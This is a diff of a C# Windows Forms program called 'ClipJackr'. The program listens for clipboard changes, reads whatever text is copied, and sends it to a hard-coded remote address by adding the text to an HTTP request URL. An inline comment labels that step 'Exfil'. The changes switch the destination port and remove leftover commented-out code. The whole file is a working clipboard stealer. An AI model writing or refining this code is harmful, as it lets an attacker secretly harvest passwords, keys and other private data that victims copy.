@@ -8,7 +8,6 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net;
-using System.Text;
 
 /// <summary>
 /// ClipJackr
@@ -24,12 +23,10 @@ namespace WindowsFormsApp1
         {
             InitializeComponent();
             //Turn the child window into a message-only window (refer to Microsoft docs)
+            //NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
             //Place window in the system-maintained clipboard format listener list
             NativeMethods.AddClipboardFormatListener(Handle);
-
             TopMost = true;
-
-            //richTextBox1.AppendText(Clipboard.GetText());
         }
         protected override void WndProc(ref Message m)
         {
@@ -37,7 +34,7 @@ namespace WindowsFormsApp1
             if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
             {
                 //Get the date and time for the current moment expressed as coordinated universal time (UTC).
-                DateTime saveUtcNow = DateTime.UtcNow;
+                //DateTime saveUtcNow = DateTime.UtcNow;
                 // Console.WriteLine("Copy event detected at {0} (UTC)!", saveUtcNow);
 
                 //Write to stdout active window
@@ -51,17 +48,9 @@ namespace WindowsFormsApp1
                 var cliptext = Clipboard.GetText();
                 richTextBox1.AppendText(cliptext);
                 // Exfil.. Send to remote server.
-                var request = (HttpWebRequest)WebRequest.Create("http://192.168.0.110:81/"+cliptext);
-                
+                // webserver must return a 200 response on all requests.
+                var request = (HttpWebRequest)WebRequest.Create("http://192.168.0.110:8123/"+cliptext);
                 WebResponse response = request.GetResponse();
-                //Console.WriteLine(((HttpWebResponse)response).StatusDescription);
-
-/*                using (Stream dataStream = response.GetResponseStream())
-                {
-                    StreamReader reader = new StreamReader(dataStream);
-                    string responseFromServer = reader.ReadToEnd();
-                    Console.WriteLine(responseFromServer);
-                }*/
                 response.Close();
 
             }
